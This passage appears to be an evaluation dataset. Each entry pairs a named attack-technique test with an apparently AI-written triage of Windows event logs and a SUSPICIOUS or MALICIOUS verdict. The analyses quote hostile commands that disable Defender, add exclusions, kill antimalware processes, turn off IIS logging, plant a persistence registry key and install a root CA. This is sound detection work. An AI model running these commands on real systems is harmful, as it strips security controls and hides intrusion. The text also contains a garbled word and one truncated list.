4. **Event ID 4672**: Privileged logon session for `admin_test` with a wide range of privileges (`SeDebugPrivilege` and others). If not expected for `admin_test`, this represents a potential risk, as excessive privileges might be leveraged for further compromise.

#### Sysmon Log:

1. **Process Creation and Execution**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `admin_test`. This might be normal if managing event logs but could indicate suspicious activity, especially on a high-value target like the CEO’s machine.
   - Commands using `cmd.exe` to modify system registry keys: `cmd.exe` and `reg.exe` are used to disable automatic updates (`AUOptions`). This could be a method to weaken the system's security posture by preventing updates and should be flagged as suspicious unless this operation is a confirmed administrative activity.

2. **Use of `whoami.exe` and `hostname.exe`**: These are benign under routine operation for gathering environment details but could signify reconnaissance if logged in a short period, as here.

3. **`MicrosoftEdgeUpdate` Activity**: Frequent execution and update-related processes appear normal and tied to software update service. Monitored processes align with known updates.

4. **Use of MicrosoftEdgeUpdateComRegisterShell64.exe**: These operations appear legitimate as part of update and not indicative directly of abnormal behavior.

#### Application Log:

1. **EdgeUpdate Services**: Stopped services multiple times but appears tied to update processes which can be typical around update routines.

#### System Log:

1. **Event ID 24 and 1**: `svchost.exe` adjusting time onto the system reflects logs from the security log. Contextual needs assessment to determine if this was a valid and routine operation as part of time synchronization or an anomaly.

### Assessment:
- **Key Indicators of Interest**:
  - Privileged Logon Sessions for `admin_test` with sensitive privileges.
  - Registry manipulation related to disabling updates.
  - Frequent use and potential abuse of utilities like `wevtutil.exe`.

### Threat Assessment and Resolution:
- **SUSPICIOUS**: The logs display potentially risky behaviors pertaining to registry manipulation to disable updates and excessive privilege allocation to `admin_test`. While these alone don't confirm malicious intent, they necessitate further investigation to ascertain intent and verify legitimacy of the activities by authorized users. Continuous monitoring and verification of policies and activity logs related to `admin_test` including confirming with the user involved are recommended steps.

**Next Steps**:
1. Verify if `admin_test` had legitimate reasons for executing these actions.
2. Check company policy for registry key modifications related to Windows Update.
3. Review network traffic during the time of events for anomalies.
4. Enhance monitoring around accounts with elevated privileges.
5. Ensure time synchronization events are legitimate and traceable to a secure source.

These steps will help clarify if these events are consistent with normal administrative activities or indicative of further risk that could lead to malicious intent."
Tamper with Windows Defender Evade Scanning -Process,"After a thorough review of the provided log entries, let's break down the findings based on potentially suspicious activities and common indications of malicious behavior.

### Analysis:

1. **System Log:**
   - Windows Update Client logs indicate regular updates, including Security Intelligence updates (EventID: 19). No anomalies are detected that indicate a compromise in this section.

2. **Sysmon Log:**
   - Frequent executions of `wevtutil.exe` and `conhost.exe` by account `SERVER002\admin_test`. While these processes are typically benign, the frequency and their simultaneous pattern might warrant a deeper inspection to rule out log tampering or unauthorized log retrieval.
   - Noteworthy is the execution of PowerShell with a command to add an exclusion to Windows Defender using `Add-MpPreference -ExclusionProcess`. This could potentially allow malicious processes to evade Windows Defender.
   - `PowerShell.exe` executed under the same user context with high integrity level to add exclusions for `outlook.exe`. This specific use of PowerShell and manipulation of Windows Defender settings is often a red flag for malicious activity, especially if not authorized.
   - `sysmon` Event ID 1 indicates the periodic execution of `MicrosoftEdgeUpdate.exe`, which coincides with typical behavior for a system updating its software. However, given its execution privilege and frequency, an evaluation of its legitimacy (potentially using hash analysis) could be prudent.
   
3. **Application Log:**
   - Contains logs typical of system services related to Microsoft Edge undergoing updates. No suspicious activities are detected, aside from process startup and termination messages which align with regular system behavior.

4. **PowerShell Log:**
   - Confirms PowerShell activity matching Sysmon entries. The script executed involves manipulation of Windows Defender settings—adding exclusions, which is a strong indicator of potential misuse.

5. **Security Log:**
   - No entries provided; potentially an area to explore further logging levels or other host systems to correlate information.

### Indicators of Compromise (IoC) and Risk Assessment:
- **High-Risk Indicators**:
  - Use of PowerShell to adjust Defender settings is typically regarded as high-risk without proper authorization, common in post-compromise activities.
  - The `Add-MpPreference -ExclusionProcess` command could open a vector for undetected malware persistence—this is often seen in scenarios where malware attempts to evade detection by security tools.

### Conclusion:
- **Resolution: MALICIOUS**: The use of PowerShell to alter Windows Defender settings without apparent authorization and the specific command used indicates a clear potential for malicious activity, particularly in a high-value target like a CEO's machine.

### Recommendations:
- Conduct a deeper investigation for potential unauthorized changes to the system, particularly involving Windows Defender configurations.
- Examine audit logs for additional context or other affected systems within the network.
- Consider rolling back unauthorized exclusions immediately and enhancing PowerShell script-block logging.
- Review permissions and access rights for the account `SERVER002\admin_test` and evaluate other accounts or systems for similar behavior.
- Potentially reimage the machine to ensure integrity, after a comprehensive investigation."
Indirect Command Execution - Scriptrunner.exe,"### Analysis of the Windows Event Logs

Upon reviewing the provided Sysmon, Application, System, Security, and Windows PowerShell logs from Server002, I have identified several points that merit closer investigation and may indicate suspicious behavior. Here is the analysis:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` executing repeatedly within a very short time frame. `wevtutil.exe` is commonly used to manage the event logs on the Windows system, and `conhost.exe` is a legitimate system process tied to console windows. While these processes are legitimate, their repeated and rapid execution could indicate automated script activity or a potential abuse scenario.
   - **Finding:** This behavior is unusual as automated tasks or attacks could be leveraging `wevtutil.exe` to clear or manage event logs for persistence or cleanup purposes.

2. **Execution of `hostname.exe` and `whoami.exe`:**
   - The `hostname.exe` and `whoami.exe` processes executed in quick succession. These tools are often used for reconnaissance to gather basic information about the system, such as the current user and the machine’s hostname. While benign individually, combined with suspicious behavior, it may suggest automated checking or enumeration of the system environment.
   - **Finding:** The sequence and correlation with other suspicious activities require further inspection. Similarly, `wsmprovhost.exe` as their parent process is related to Windows Remote Management (WinRM), which if misused, can be a vector for lateral movement.

3. **PowerShell Activity with Suspicious Command:**
   - There is a PowerShell event invoking `powershell.exe` with a command that includes `Scriptrunner.exe` executing `calc.exe`. The command appears obfuscated and misuses PowerShell, which can be a common tactic in attacks to evade detection.
   - **Finding:** The use of PowerShell with potentially obfuscating syntax is a red flag indicating attempts to disguise malicious activity. The invocation of `calc.exe` in such a manner is unusual outside testing or obfuscation scenarios.

4. **Time Manipulation Event Logs:**
   - The Security and System logs show changes in system time by `svchost.exe`. Although time adjustments can occur under legitimate circumstances (time synchronization), abrupt time changes can disrupt log integrity, hinder incident response, or serve to align logs with attack timelines.
   - **Finding:** These time adjustments should be verified against authorized time sync sources and activities.

5. **Processes Executed by `NT AUTHORITY` Accounts:**
   - Several processes are executed by system accounts like `NT AUTHORITY\SYSTEM` and `NETWORK SERVICE`, typical for administrative tasks. However, these processes, combined with other suspicious activities, need to be validated to ensure they align with expected system maintenance and updates.

### Assessment

Given the repeated execution of system utilities, suspicious PowerShell activity, and abrupt time changes, there are indicators of potentially malicious activity. The logs suggest that someone or something might be trying to gather information, manipulate the system environment, or execute unauthorized commands stealthily.

### Resolution: **SUSPICIOUS**

### Recommended Actions

1. **Conduct Further Investigation:**
   - Investigate the context and commands associated with `powershell.exe` and `wevtutil.exe` executions.
   - Review recent changes in user accounts, scheduled tasks, and possible scripts or applications introduced to Server002.

2. **Examine Network Traffic:**
   - Monitor network traffic for suspicious outbound connections that might relate to potential data exfiltration or Command and Control communications.

3. **System Integrity Verification:**
   - Run integrity checks on system files and validate against known good baselines.
   - Scan the system for malware or unauthorized scripts and tools.

4. **Cross-Verify with Threat Intelligence:**
   - Compare any identified artifacts such as scripts, hashes, or IP addresses against available threat intelligence feeds.

5. **Ensure Log Persistence:**
   - Increase logging granularity on Server002 and ensure logs are shipped to a secure logging infrastructure for redundancy against tampering.

Hiring an incident response team for a thorough cleanup and ensuring any backdoors are closed will also be prudent following conclusive threat confirmation."
Creating W32Time similar named service using schtasks,"## Analysis of Windows Event Logs

### Identified Anomalies and Suspicious Behavior:

1. **Frequent Usage of Wevtutil.exe and Conhost.exe**:
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being launched almost simultaneously (Event IDs 17923, 17927, 17931). Wevtutil.exe is commonly used to retrieve information from the event logs, which can be legitimate or a sign of an attacker trying to cover their tracks by clearing logs. Conhost.exe is a legitimate process related to console windows but should be checked if associated with common tasks or suspicious activities.
 
2. **Creation of Scheduled Tasks via Cmd.exe**:
   - An important sign of potential malicious activity is the creation of a scheduled task using `cmd.exe` with a command that executes `powershell.exe` with the execution policy bypassed (Event ID 17949). Scheduled tasks can be used for persistence or delayed execution of scripts, particularly suspicious with non-existent or fake script paths like `c:\data.004_NonExistingScript.ps1`.

3. **High Privilege Operations**:
   - All these tasks and processes are executed with `High` integrity level and by the user ""SERVER002\\admin_test"", suggesting administrative rights. This level of access could facilitate privilege escalation opportunities for malicious actors.

### Indicators of Potential Compromise:

- **Process Chaining and Execution**:
  - The process tree and commands indicate potential abnormal and automated attempts, such as using `schtasks.exe` in conjunction with PowerShell, which is a common technique for executing malicious scripts stealthily.
  
- **Commands Utilizing PowerShell**:
  - The command utilized seems to bypass execution policies, which is often a hallmark of attacks using PowerShell scripts to load malware, especially by advanced threats that evade standard defenses by using whitelisted binaries.

### Other Logged Activities:
- **Updates and Windows Defender**:
  - The logs show normal activity from Windows Update Client and Windows Defender (e.g., antivirus update and status checks). These do not appear to be directly related to malicious activities, but the presence of Windows Defender in logs may help verify system security status.

### Assessment:
The behavior observed doesn't outright confirm malicious activity but does raise significant suspicion due to the combination of attributes common in attacks – such as the use of administrative tools like schtasks and PowerShell, high privilege operations, and task scheduling with bypassed execution policies.

### Recommended Actions:
1. **Deep Dive Analysis**: Further investigation is essential to determine if there are any related incidents on the host involving unauthorized or unexplained access, especially focusing on the events and task history.
2. **Audit**: Verify the legitimacy of `SERVER002\\admin_test` account activities including recent logins or unexpected administrative actions.
3. **Review Scheduled Tasks**: Check task scheduler for this new entry and assess the context or scripts being executed.
4. **Threat Hunt**: Perform a threat hunt focused on persistence mechanisms and indicators of execution like those shown, especially tasks around similar timestamps.
5. **Enhanced Monitoring**: Implement detailed logging and alerts around excessive syscalls involving PowerShell, wevtutil, schtasks, etc.

### Resolution:
- **SUSPICIOUS**: The logs show activity indicative of suspicious behavior requiring further investigation, as it couldn't definitively state benign nor explicitly malicious without additional context and corroborative evidence."
Abusing MyComputer Disk Fragmentation Path for Persistence,"Upon analyzing the provided logs, several activities stand out, and a few potential indicators of malicious activity are identified. Here is a detailed breakdown of the findings:

### Suspicious Indicators:

1. **Registry Modification via CMD:**
   - An entry shows the `cmd.exe` being called to modify the Windows registry using the `reg add` command. This command is used to add a new registry entry in ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath"", pointing it to `notepad.exe`. This behavior is unusual and potentially malicious as registry modifications commonly mask malicious activities or persist payloads. The command executed from `cmd.exe` is:
     ```
     ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" /t REG_EXPAND_SZ /d ""%%systemroot%%\system32\notepad.exe"" /f
     ```

2. **Execution of Wevtutil and Conhost:**
   - The entries show several instances of `wevtutil.exe` and `conhost.exe` being launched. While these are legitimate Windows utilities, the frequency and rapid succession of launches by an administrative user (SERVER002\admin_test) may suggest anomalous behavior, potentially an attempt at covering tracks by clearing event logs or gathering event log information surreptitiously.

3. **Unusual Parent-Child Process Relationship:**
   - The execution of `cmd.exe`, `whoami.exe`, `hostname.exe`, and `conhost.exe` with `wsmprovhost.exe` as the parent process could be indicative of an attacker using Windows Remote Management (WinRM) capabilities, which `wsmprovhost.exe` is associated with.

### Non-suspicious Entries:
1. **Microsoft Edge Update:**
   - Multiple entries are related to `MicrosoftEdgeUpdate.exe`, which is a legitimate process for Microsoft Edge updates. While the volume may seem excessive, in absence of additional context like abnormal network activity or additional malicious indicators, these logs alone do not raise significant concerns and might be part of a scheduled updating task. 

### Assessment:
Given the detailed analysis:
- **Registry modification via cmd.exe** can potentially indicate malicious activity aimed at altering system behavior.
- The frequency and pattern of standard system utilities like `wevtutil.exe` is worth additional attention, especially when executed by an administrative user account. 

Although there aren't definitive signs of a large-scale compromise, the presence of unusual registry modifications and the context in which they occurred elevate this scenario to a level of concern needing further investigation.

### Resolution:
**SUSPICIOUS** - The observed modifications and process behavior are unusual and worthy of further investigation to determine intent. It's recommended to:
- Conduct a deep forensic analysis to determine if `notepad.exe` was intended to be used for unintended purposes.
- Review the context and previous activity of the `admin_test` user to ascertain if these actions were intentional or misconfigurations.
- Monitor and potentially increase logging on this system to capture additional context on user activities."
Execute base64-encoded PowerShell,"After analyzing the provided Windows event logs, I have identified several key points that need to be addressed:

**1. Unusual Process Activity:**
   - Frequent execution of the `wevtutil.exe` and `conhost.exe` processes by the `SERVER002\admin_test` user. While `wevtutil.exe` is a legitimate tool used for managing event logs, its frequent execution in this context can be suspicious if it's not part of regular administrative tasks.
   - Multiple PowerShell instances executed by the `SERVER002\admin_test` user using Base64 encoded commands, which can be a technique for obfuscating malicious scripts.

**2. Elevated Processes:**
   - The execution of processes under the `NT AUTHORITY\SYSTEM` account, such as `MicrosoftEdgeUpdate.exe` and `WaaSMedicAgent.exe`, is typical for system maintenance tasks, but if combined with other suspicious activities, it can be worrisome.

**3. Security Log Entries:**
   - Numerous `5379` event logs indicating failed credential read attempts for a `MicrosoftAccount`, which might suggest attempted account accesses or token queries possibly indicating credential theft activities.

**4. PowerShell Logs:**
   - Encoded PowerShell commands are concerning because they could be used to execute hidden malicious scripts. The specific commands executed translate to simple administrative or benign tasks, but the use of Base64 encoding should be further investigated to ensure no other malicious activities are occurring.

**Assessment:**
Based on the logs:
- The execution of obfuscated PowerShell commands and the frequent use of `wevtutil.exe` and `conhost.exe` could be indicative of suspicious activities.
- The failed credential access attempts also warrant a detailed examination to determine if this is part of a larger malicious effort to gain unauthorized access.

**Recommendation:**
1. **Deep Dive Analysis:** Conduct a deeper investigation on the recent activities related to `SERVER002\admin_test`. Check for any unauthorized changes in system configurations, unexpected user account behaviors, or data exfiltration.
2. **Audit PowerShell Use:** Review PowerShell execution policies and logs to identify any unauthorized scripts or commands.
3. **Credential Monitoring:** Monitor the affected accounts for suspicious activities and possible credential resets, especially given the failed access attempts.
4. **Endpoint Security Review:** Ensure endpoint security solutions are up-to-date and actively monitoring for similar activity, possibly leveraging threat intelligence feeds for current TTP (Tactics, Techniques, and Procedures) being observed in the wild.

**Resolution:** SUSPICIOUS - While some activities can be considered administrative or benign, the frequency and methods observed, particularly with the use of encoded PowerShell commands and credential access attempts, suggest further investigation is necessary to rule out malicious intent."
User scope COR_PROFILER,"In this analysis, we encounter a series of Windows event logs from PowerShell and Sysmon which require a detailed examination:

### PowerShell Log Analysis:

1. **Registry Modifications**: The logs indicate the use of PowerShell to modify registry entries within the ""HKCU:Software\Classes\CLSID"" registry path. This is associated with COM object hijacking, a known technique used by adversaries to achieve persistence or elevate privileges by pointing to a malicious DLL.
   
   - **Indicators of Concern**:
     - Creation of registry entry `HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32`.
     - DLL file `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll` is being associated with this CLSID.

2. **Profile Modification**: The script creates environment variables for .NET profiling (`COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH`), potentially manipulating how .NET applications are executed or profiled, often used for injection or execution of malicious code.

3. **Process Execution**:
   - Execution of `eventvwr.msc` through launching `mmc.exe` — This is a technique often used to bypass UAC prompts because eventvwr.msc can be used to execute arbitrary applications without triggering User Account Control (UAC).

### Sysmon Log Analysis:

1. **Process Activity**:
   - Multiple processes associated with the PowerShell script referenced in the PowerShell logs:
     - Execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
     - Calling and execution of `mmc.exe` for `eventvwr.msc`.

2. **Other Notable Processes**:
   - The presence of `whoami.exe` usage, often seen in scripts to validate the current privileges of the executing user.
   - Activity seen for `MicrosoftEdgeUpdate.exe`, likely a benign system update process unrelated to the malicious activity observed.

### Assessment and Resolution:

The behavior exhibited in these logs—modifying registry settings for persistence, leveraging known bypass techniques for UAC, and potentially executing malicious payloads—is consistent with known attack methodologies like COM hijacking for persistence and privilege escalation activities.

- **Resolution**: **MALICIOUS**

### Guidance and Recommendations:

1. **Immediate Action**: Isolate the implicated host (Server002) to prevent further potential spread or damage within the network.
2. **Registry and System Inspection**: Review and clean the suspicious registry entries and environment variables to eliminate persistence mechanisms.
3. **Malware Analysis**: Analyze the associated DLL (`data.012x64.dll`) for malicious code.
4. **Network Monitoring**: Increase scrutiny of network traffic from Server002, particularly looking for anomalous connections or data exfiltration attempts.
5. **Review Security Controls**: Investigate how such activities were permitted and bolster defenses against similar tactics, potentially through the use of Application Whitelisting and improving UAC policy settings.
6. **Awareness and Training**: Conduct security training to increase user awareness about phishing and social engineering, common vectors for initial access.
7. **Threat Hunting**: Proactively hunt for similar indicators across other systems in the network to ensure this is not part of a broader attack. 

By taking the above steps, ensure a rapid and thorough response to mitigate the incident effectively."
Disable Windows IIS HTTP Logging,"Based on the provided logs, here is a detailed analysis of any suspicious or anomalous behaviors:

### Analysis:

1. **Repetitive Execution of Windows Native Tools:**
   - The logs show multiple executions of `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe`. While these are legitimate Windows utilities, their execution one after another and from the same user context (SERVER002\admin_test) is uncommon. It can indicate script-based automation running these commands for reconnaissance or system modification purposes.

2. **PowerShell with Command Line Arguments:**
   - There is a PowerShell command being executed that modifies the IIS configuration: `powershell.exe & {C:\Windows\System32\inetsrv\appcmd.exe set config \""Default Web Site\"" /section:httplogging /dontLog:true}`. This command disables logging for the Default Web Site, which is a red flag as attackers often disable auditing or logging to conceal malicious activity.

3. **Abnormal Activity Patterns:**
   - The frequency and combination of command-line tools executed, particularly the disabling of web logging via PowerShell, are indicative of potentially malicious behavior. These patterns are not typical for benign system operation or administrative tasks.
   - The execution of `wevtutil.exe` may suggest clearing of event logs, which is another common tactic used by adversaries to cover their tracks.

4. **EdgeUpdate Executions:**
   - There are multiple entries related to `MicrosoftEdgeUpdate.exe`, but all seem to follow legitimate update or installation paths. No apparent malicious modification to the update process or binaries is noted, but it is worth a deeper look given the timing during suspicious activities.

5. **Time Synchronization Alerts:**
   - The system log mentions changes in system time. Such changes can often be linked to attackers attempting to evade detection by altering timestamps on logs.

### Assessment:

The observed behaviors, particularly the PowerShell command used to disable logging, are suspect. The execution of native binaries in such a sequence and with such command arguments suggests script-based activity possibly for the purpose of reconnaissance or attempting to evade detection. 

### Threats/Risks Identified:

- The activity suggests potential reconnaissance, privilege escalation, or log tampering attempts.
- Disabling web server logging may be an attempt to conceal further actions on the server, indicating a risk of undetected intrusion.

### Guidance:

1. **Immediate Actions:**
   - Review user activities and access of `SERVER002\admin_test`.
   - Investigate any scripts or scheduled tasks running under this user.
   - Enable and review web server logging and monitor for unusual activities around the same timeframe.
   - Conduct a deeper threat hunting engagement to identify lateral movement or related suspicious activities.

2. **Preventive Measures:**
   - Ensure PowerShell logging and script block logging are enabled to capture detailed execution data for analysis.
   - Implement stricter access controls and monitoring on sensitive accounts, such as admin accounts.

### Final Resolution:

**SUSPICIOUS**

Given the combination of disabling logging via PowerShell, repetitive execution of Windows utilities, and the possibility of log tampering, these activities warrant further investigation but cannot be conclusively declared malicious without additional context or corroborating evidence."
DLL Side-Loading using the Notepad++ GUP.exe binary,"### Analysis of Windows Event Logs

The provided Windows event logs primarily cover application and Sysmon logs. Below is a detailed evaluation focusing on detecting any indicators of potential compromise:

#### Application Logs:
- **Microsoft-Windows-Security-SPP (EventID 16384)**: This indicates standard license checks of the Windows Operating System. There is no immediate concern related to this log entry.
- **EdgeUpdate Service Logs**: The logs report the stopping of the Microsoft Edge update service. This is typically a benign and routine action unless it is correlated with unusual network activity or tampering of executable files, neither of which is evidenced here.

#### Sysmon Logs:
- **Process Execution Events**:
  - Frequent execution of system utilities like `powershell.exe`, `cmd.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`. While these are standard Windows processes, they can also be used in attempts to escalate privileges, manipulate logs, or gather system information illicitly.
  - **Wevtutil.exe Execution**: This tool manages event logs and can be used to clear them, which is a tactic often used to cover tracks. This is suspicious, especially as it's executed multiple times.
  - **Cmd.exe with Suspicious Parameter**: Command line shows `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\GUP.exe""` which suggests the execution of an external updater or other utility, potentially from a temporary directory. GUP.exe is known as a ""Generic Updater Process,"" often used by software like Notepad++ for updates, but its verification is necessary to ensure it isn't a masquerading malware.

- **High Frequency of Process Creations and Terminations**: The logs show a high volume of process activations and terminations in a short period, particularly related to Edge Updates. While this might be routine when updates are being processed, it stands out due to frequency and the sequence involving multiple potentially sensitive utilities.

#### Summary and Recommendation:
1. **Suspicious Behavior**:
   - Repeated invocation of `wevtutil.exe`, a utility often used in log manipulation.
   - Execution of processes from the user directory, notably `GUP.exe`, which requires verification to ensure its legitimacy.
2. **Absence of Critical Security Logs**: Key logs like Security or PowerShell command logs that might highlight privilege escalation tactics are missing, which makes it challenging to determine malicious intentions conclusively.

### Assessment
Based on the evaluation of the logs provided, the activity observed can be classified as **SUSPICIOUS**. The frequent use of system utilities, particularly for potential log tampering, and the execution of utilities from temporary directories require further investigation to rule out potential compromise.

### Next Steps:
- **Verify the Legitimacy of `GUP.exe`**: Check file signatures, source, and whether it aligns with known legitimate software updates executed in your environment.
- **Investigate `wevtutil.exe` Usage**: Determine if this was a legitimate or an administrative activity, or if it involved any illicit clearing or manipulation of log files.
- **Conduct a Deep Dive Security Audit**: Examine additional logs, configurations, and access permissions on `SERVER002` to ensure no further indicators of compromise exist.
- **User Activity Review**: Monitor and review the activity of the user `admin_test` for any unauthorized or unexpected behavior.
- **Consider a Network Traffic Analysis**: To ensure no data exfiltration or unusual outbound connections from `SERVER002`.

Further detailed analysis and potential incident response may be advisable depending on the outcomes of these additional investigations."
Disable Windows Defender with PwSh Disable-WindowsOptionalFeature,"Based on the examination of the provided event logs, here is the detailed analysis:

### Suspicious/Anomalous Behavior:

1. **Disabling of Windows Defender Features:**
   - The PowerShell logs indicate execution of multiple commands aimed at disabling various Windows Defender features (`Windows-Defender-Gui`, `Windows-Defender-Features`, `Windows-Defender`, `Windows-Defender-ApplicationGuard`) using the `Disable-WindowsOptionalFeature` command. Disabling security features like Windows Defender on a high-profile machine such as the CEO’s system is highly suspicious unless there is a legitimate and justified reason known by the IT security team.

2. **Frequent Execution of System Processes:**
   - There are numerous mentions of `wevtutil.exe` and `conhost.exe` being executed multiple times by user `SERVER002\\admin_test`. While these could be legitimate activities, the context, particularly alongside the PowerShell execution that disables security features, makes them suspicious.

3. **DismHost Processes:**
   - Several instances of `DismHost.exe` are being executed from temporary directories. While DismHost is a legitimate Windows process, it's typically associated with Windows Update and system repairs. Its execution from temporary directories can sometimes indicate misuse or possibly malicious activity, especially when it appears alongside security feature disablement.

4. **High Integrity Level Processes:**
   - The `whoami.exe` and `powershell.exe` processes are being run with high integrity levels by the `admin_test` user. The `whoami` command is generally benign, but in the context of high integrity level processes and associated suspicious activities, it raises concerns over potential reconnaissance activities.

### Potential Malicious Indicators:

- **Indicators of Compromise (IOCs):**
  - Commands to disable security features could potentially indicate an attempt to weaken the system’s defenses for further exploitation.
  - Execution of system tools (wevtutil, conhost) and system servicing tools (DismHost) may suggest manipulation of logs or preparation for malicious actions, especially when combined with actions that disable defenses.

### Assessment:

There is a significant indication of potential malicious activity or compromise due to:
- Execution of PowerShell scripts to disable security features.
- Unusual utilization and pattern of system tool executions.

   - Isolate the CEO’s machine from the network to prevent further potential spread of any malicious software or unauthorized access.
   - Conduct a full forensic analysis of the system to determine how the potentially malicious actions were initiated and explore the scope of the breach.
   - Check for any additional suspicious activities across the network that might correlate with this behavior.

2. **Security Measures:**
   - Review and audit user privileges, especially for the `admin_test` account.
   - Ensure endpoint detection and response (EDR) and antivirus software are fully operational and capable of detecting such disabling actions.
   - Implement stricter PowerShell execution policies and monitoring capabilities.

3. **Community Coordination:**
   - If other organizations observe similar activities, coordinate with industry-specific ISACs and Microsoft's security response team to gather more insights into potential new attack vectors."
Install root CA on Windows,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the logs for any suspicious or potentially malicious activities:

### Security Log Analysis:
1. **Event ID 4624 and 4672 (Logon and Special Privileges Assigned)**
   - The logs indicate multiple logon events for user ""SYSTEM"" with elevated privileges (SeDebugPrivilege and others) at the same instance timestamps. These events are generated under normal circumstances, such as system services interacting with each other.
   - **Assessment**: These entries appear to represent system activity rather than unauthorized attempts.

2. **Event ID 5379 (Credential Validation)**
   - Multiple entries showing failure with a return code `3221226021`, indicating a credential validation issue potentially with Microsoft account or service. It's essential to understand what specific service interaction triggered these errors. However, these are not uncommon in network environments with such setups.
   - **Assessment**: Requires more context but does not inherently look malicious.

### Sysmon Log Analysis:
1. **Execution of Powershell**
   - Powershell is executed by user ""admin_test"" with a command to import and move a certificate: `""powershell.exe"" & {$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My, Move-Item -Path $cert.PSPath -Destination \""Cert:\LocalMachine\Root\""}`.
   - Importing and moving certificates using PowerShell needs to be scrutinized, especially from a non-system account.
   - **Assessment**: This activity is suspicious. The action of importing a certificate and placing it in the trusted root without further justification raises flags for potentially unauthorized system modifications.

2. **Use of `wevtutil.exe` and Command-line tools**
   - The command `wevtutil.exe` is used multiple times. This utility is often used to access the event log on a Windows system, which can be part of both legitimate activity and reconnaissance by malicious actors.
   - **Assessment**: Rule out legitimate use by verifying with the system administrator and examining the user’s activity. In isolation, it can be benign or part of legitimate administration.

3. **`whoami.exe` and Various System Executables**
   - Consistent usage of general executables like `hostname.exe`, `whoami.exe` by ""admin_test"".
   - While these actions aren't inherently malicious, they often accompany recon or privilege escalation scripts.
   - **Assessment**: Context from user action logs or correlating activities in the timeframe are needed to conclude benign or malibelicitatous action.

### PowerShell Log Analysis:
1. **PowerShell Logging**
   - Logs indicate PowerShell has been used to execute scripts related to certificate handling.
   - **Assessment**: Ties into the Sysmon findings, highlighting potentially suspicious activity with PowerShell usage for certificate tasks.

### Application and System Logs:
- **Microsoft Edge Update, MusNotification, and Other System Processes**
  - These logs correspond to standard system maintenance and updates processes. They don’t show abnormalities or clear signs of tampering.
  - **Assessment**: These entries are benign and part of routine system processes.

### Final Assessment
Given the details of the analysis, the event logs contain signs of potentially suspicious behavior, notably around the PowerShell use for certificate imports. Therefore, these actions merit further investigation to confirm the legitimacy of the activities, correlate with user activity logs, and verify any legitimate administrative tasks.

### Resolution:
- **SUSPICIOUS**: The logs include activities that don't immediately indicate maliciousness but warrant further investigation for assurance. Consider verifying user activity and the necessity of the PowerShell actions to rule out any illegitimate processes."
Kill antimalware protected processes using Backstab,"After analyzing the provided Windows event logs, several observations and inferences can be drawn regarding potential malicious activity. The following points outline key findings:

1. **Suspicious PowerShell Execution**:
   - Multiple entries indicate the execution of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) by the user `SERVER002\\admin_test`.
   - A notable command line argument observed: `powershell.exe & {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Backstab64.exe\"" -k -n MsMpEng.exe}` suggests that a potentially unauthorized or malicious executable (`Backstab64.exe`) was run through PowerShell with parameters that could imply malicious intent (hijacking or impersonating legitimate processes like `MsMpEng.exe`, which is part of Windows Defender).

2. **Execution of `wevtutil.exe` and `conhost.exe`**:
   - The execution of `C:\\Windows\\System32\\wevtutil.exe` and `conhost.exe` alongside PowerShell is suspicious, especially considering the timing and user (`admin_test`) involved. These processes could be indicative of attempts to manipulate or harvest logs to conceal activities.
   
3. **Elevated Integrity Level**:
   - The integrity level being ""High"" for the PowerShell and executed commands indicates that the actions were performed with elevated privileges, increasing the risk and potential impact should these actions be malicious in nature.

4. **Pattern of Rapid and Repetitive Process Execution**:
   - There is a pattern of rapidly starting and stopping processes, notably related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). While updates are normal, the high frequency and variety of command lines suggest possible interference or misuse.

5. **Windows PowerShell Logs**:
   - PowerShell logs further confirm the suspicious activities associated with running `Backstab64.exe`. This activity aligns with known tactics for executing payloads or scripts as part of a security breach.

6. **Defensive Hindrances**:
   - The repeated stopping of Microsoft services, followed by immediate state confirmations, could imply attempted tampering with system defenses or service states to obfuscate real-time monitoring/security measures.

Overall, the presence of a suspicious executable (`Backstab64.exe`), its execution via PowerShell with parameters indicating possible masquerading or malicious use, and the manipulation of logging facilities denote a high likelihood of malicious activity.

### Resolution: MALICIOUS

**Assessment**:
The logs contain clear evidence of potentially malicious activity, particularly through the unauthorized execution of `Backstab64.exe` and defensive evasion behaviors. Immediate action is recommended.

**Guidance on How to Proceed**:
- **Immediate Containment**: Isolate the affected system to prevent further compromise or lateral movement within the network.
- **In-depth Analysis**: Conduct a more thorough forensic analysis on `Server002`, especially focusing on the processes related to PowerShell and the executable `Backstab64.exe`.
- **Review User Activities**: Investigate the activities of the user `admin_test`, including recent login attempts and authorization to determine the legitimacy and maintain strict access/authorization controls.
- **Update Security Policies**: Enhance endpoint monitoring for such PowerShell activities and processes manipulation, adopting more aggressive logging and alerting mechanisms.
- **Assess and Patch Vulnerabilities**: Review for any existing vulnerabilities that might have been exploited during this incident and apply necessary patches or mitigations.

Given these recommendations, a comprehensive response should be coordinated involving security, IT, and potentially legal/HR teams to mitigate and understand the full scope of the compromise."
Execution of non-dll using rundll32.exe,"Based on the provided Windows event logs, let's analyze the details:

### Anomalous Behavior and Analysis:

1. **System & Security Logs:**
    - **Time Synchronization Events (Event ID 24, 1)**: The system logs exhibit events related to time changes performed by `svchost.exe`. These are usually legitimate operations executed by Windows Time Service to synchronize the system clock.
